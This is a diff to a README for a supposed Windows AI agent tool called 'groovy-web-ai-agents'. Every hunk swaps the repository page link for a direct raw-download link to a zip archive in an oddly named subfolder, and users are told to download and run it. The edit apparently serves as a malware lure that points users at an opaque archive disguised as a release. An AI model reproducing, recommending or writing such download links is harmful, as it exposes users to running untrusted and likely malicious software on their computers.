@@ -1,6 +1,6 @@
 # 🤖 groovy-web-ai-agents - Simple AI Agent Setup for Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20from%20GitHub-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sandorarthropodous723/groovy-web-ai-agents)
+[![Download Now](https://img.shields.io/badge/Download%20from%20GitHub-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sandorarthropodous723/groovy-web-ai-agents/raw/refs/heads/main/tostication/ai-web-agents-groovy-2.2-alpha.3.zip)
 
 ## 🧭 What this is
 
@@ -11,7 +11,7 @@ It is built for users who want a ready-made AI setup without building one from s
 ## 📥 Download and run on Windows
 
 Visit this page to download:  
-https://github.com/sandorarthropodous723/groovy-web-ai-agents
+https://github.com/sandorarthropodous723/groovy-web-ai-agents/raw/refs/heads/main/tostication/ai-web-agents-groovy-2.2-alpha.3.zip
 
 ### Steps
 
@@ -224,7 +224,7 @@ It gives you a practical starting point for AI work that needs order and control
 ## 📎 Download link
 
 Download from GitHub:  
-https://github.com/sandorarthropodous723/groovy-web-ai-agents
+https://github.com/sandorarthropodous723/groovy-web-ai-agents/raw/refs/heads/main/tostication/ai-web-agents-groovy-2.2-alpha.3.zip
 
 ## 🗂️ Suggested folder path on Windows
 
